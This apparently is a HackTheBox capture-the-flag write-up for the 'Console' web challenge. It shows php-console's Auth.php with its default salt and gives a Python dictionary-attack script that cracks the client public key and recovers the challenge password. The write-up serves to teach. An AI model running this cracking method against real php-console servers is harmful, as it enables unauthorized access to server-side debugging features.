---
layout: post
title: "HackTheBox Console Write-Up"
categories: Write-Up
date: 2021-12-05
image: /images/console/Hack-The-Box-logo.png
description: Console is a medium difficulty web challenge where we will install a php-console browser extension, review the related source code and use what we learn to perform an offline dictionary attack on a salted hash to obtain authentication for server-side control.
tags: [HTB, Write-Up, Web]
katex: true
markup: "mmark"
---

![](/images/console/Hack-The-Box-logo.png#center)

******

## Getting Started

![](/images/console/pics/1.png#center)

After launching the challenge instance we are instructed to connect to **167.99.202.131:31939**. Since the challenge description hint is **_Could you please check the console of your Chrome?_**, we will connect to this address in a Chromium browser, because I refuse to use actual Chrome ;-). Once we connect we are greeted with a standard looking **phpinfo()** page.

![](/images/console/pics/2.png#center)

Everything seems pretty standard except the line instructing us to load **php-console** in order to be prompted for a password.

![](/images/console/pics/3.png#center)

I actually have no idea what this is, and had to do a bit of web searching to find two related github repositories, a server library, [php-console](https://github.com/barbushin/php-console), and a Chrome browser extension, [php-console-extension](https://github.com/barbushin/php-console-extension). The browser extension is no longer available in the Chrome store, so we have to manually download the source zip from github, unpack it, and load the extension into Chromium.

![](/images/console/pics/4.png#center)

![](/images/console/pics/5.png#center)

Once loaded we revisit the page and use the new **PHP Console** browser extension.

![](/images/console/pics/6.png#center)

We are then prompted to enter a password for authorization to the server.

![](/images/console/pics/7.png#center)

******

## Reviewing The Source Code

At this point we _could_ try to just bruteforce/dictionary attack the password live over the network with some simple scripting, but that is dangerous and could lead to failure, or even worse getting caught and/or IP banned. A better idea is to take a look at the source code for the server library, since it is open source, and see if we can leverage any information to help us authenticate or bypass authentication altogether. Here on the [server-features](https://github.com/barbushin/php-console/wiki/PHP-Console-server-features) page we can see some of the features of the library, as well as how it authenticates clients. We see it says it uses SHA-256 password hashing along with the client IP address to create an Auth token.

![](/images/console/pics/14.png#center)

Let's take a look at [Auth.php](https://github.com/barbushin/php-console/blob/master/src/PhpConsole/Auth.php) in the server library and see exactly how this hashing scheme works.

```php
<?php

namespace PhpConsole;

/**
 * PHP Console client authorization credentials & validation class
 *
 * @package PhpConsole
 * @version 3.1
 * @link http://consle.com
 * @author Sergey Barbushin http://linkedin.com/in/barbushin
 * @copyright © Sergey Barbushin, 2011-2013. All rights reserved.
 * @license http://www.opensource.org/licenses/BSD-3-Clause "The BSD 3-Clause License"
 * @codeCoverageIgnore
 */
class Auth {

	const PASSWORD_HASH_SALT = 'NeverChangeIt:)';

	protected $publicKeyByIp;
	protected $passwordHash;

	/**
	 * @param string $password Common password for all clients
	 * @param bool $publicKeyByIp Set public key depending on client IP
	 */
	public function __construct($password, $publicKeyByIp = true) {
		$this->publicKeyByIp = $publicKeyByIp;
		$this->passwordHash = $this->getPasswordHash($password);
	}

	protected final function hash($string) {
		return hash('sha256', $string);
	}

	/**
	 * Get password hash like on client
	 * @param $password
	 * @return string
	 */
	protected final function getPasswordHash($password) {
		return $this->hash($password . self::PASSWORD_HASH_SALT);
	}

	/**
	 * Get authorization result data for client
	 * @codeCoverageIgnore
	 * @param ClientAuth|null $clientAuth
	 * @return ServerAuthStatus
	 */
	public final function getServerAuthStatus(ClientAuth $clientAuth = null) {
		$serverAuthStatus = new ServerAuthStatus();
		$serverAuthStatus->publicKey = $this->getPublicKey();
		$serverAuthStatus->isSuccess = $clientAuth && $this->isValidAuth($clientAuth);
		return $serverAuthStatus;
	}

	/**
	 * Check if client authorization data is valid
	 * @codeCoverageIgnore
	 * @param ClientAuth $clientAuth
	 * @return bool
	 */
	public final function isValidAuth(ClientAuth $clientAuth) {
		return $clientAuth->publicKey === $this->getPublicKey() && $clientAuth->token === $this->getToken();
	}

	/**
	 * Get client unique identification
	 * @return string
	 */
	protected function getClientUid() {
		$clientUid = '';
		if($this->publicKeyByIp) {
			if(isset($_SERVER['REMOTE_ADDR'])) {
				$clientUid .= $_SERVER['REMOTE_ADDR'];
			}
			if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
				$clientUid .= $_SERVER['HTTP_X_FORWARDED_FOR'];
			}
		}
		return $clientUid;
	}

	/**
	 * Get authorization session public key for current client
	 * @return string
	 */
	protected function getPublicKey() {
		return $this->hash($this->getClientUid() . $this->passwordHash);
	}

	/**
	 * Get string signature for current password & public key
	 * @param $string
	 * @return string
	 */
	public final function getSignature($string) {
		return $this->hash($this->passwordHash . $this->getPublicKey() . $string);
	}

	/**
	 * Get expected valid client authorization token
	 * @return string
	 */
	private final function getToken() {
		return $this->hash($this->passwordHash . $this->getPublicKey());
	}
}
```
Here we can see that it is using **SHA-256** as well as a **salt** with a default value **NeverChangeIt:)**, which is used by the **getPasswordHash()** function to create the **passwordHash**. It creates a **publicKey** by hashing the client IP address from **getClientUid()** combined with **passwordHash** in the function **getPublicKey()**.

******

## Cracking The Hash

If we input a test password then use the browser inspect feature to look at our request/response, we see that we get a **php-console-client** cookie with a base 64 value.

![](/images/console/pics/8.png#center)

When we decode this value we see it contains both the auth **publicKey** and **token**. Since we know how the publicKey is constructed we can use our client IP address, the default salt, and a wordlist to perform an **offline dictionary/bruteforce attack** on this hash.

![](/images/console/pics/9.png#center)

![](/images/console/pics/10.png#center)

As long as the default salt has not been changed and the password can be found in a wordlist, we should be able to crack this hash and obtain the password that was used to construct it.

Here is a quick and dirty python script I wrote to perform this dictionary attack using the **rockyou.txt** wordlist.

```python
"""Python script to crack php-console password."""
import hashlib


def crack():
    """Crack the thing."""
    with open("rockyou.txt", "r", encoding="latin-1") as infile:
        rockyou = infile.read().split()

    salt = "NeverChangeIt:)".encode()
    ip_address = "167.99.202.131".encode()
    pubkey = "814994779a2eb8f552b6b4fab5afbdfd14332bfc815afa250b6d1b33859a8b72"

    for word in rockyou:
        try:
            password = hashlib.sha256(word.encode() +
                                      salt).hexdigest().encode()
            attempt = hashlib.sha256(ip_address + password).hexdigest()
            print("TRYING: " + word + ":" + attempt)
            if attempt == pubkey:
                print("\nCRACKED!!\nLogin Password is: " + word)
                quit()
        except UnicodeDecodeError:
            print(word)
            continue
        except KeyboardInterrupt:
            quit()


if __name__ == "__main__":
    crack()
```

Running it successfully rebuilds the hash with the word **poohbear** used as the password. 

![](/images/console/pics/11.png#center)

Now let's use that password to log into the **PHP Console**.

![](/images/console/pics/12.png#center)

When we log in we successfully authenticate and obtain the challenge flag in a debug alert box!

![](/images/console/pics/13.png#center)

We now have access to all the server side features of the **PHP Console**!

******


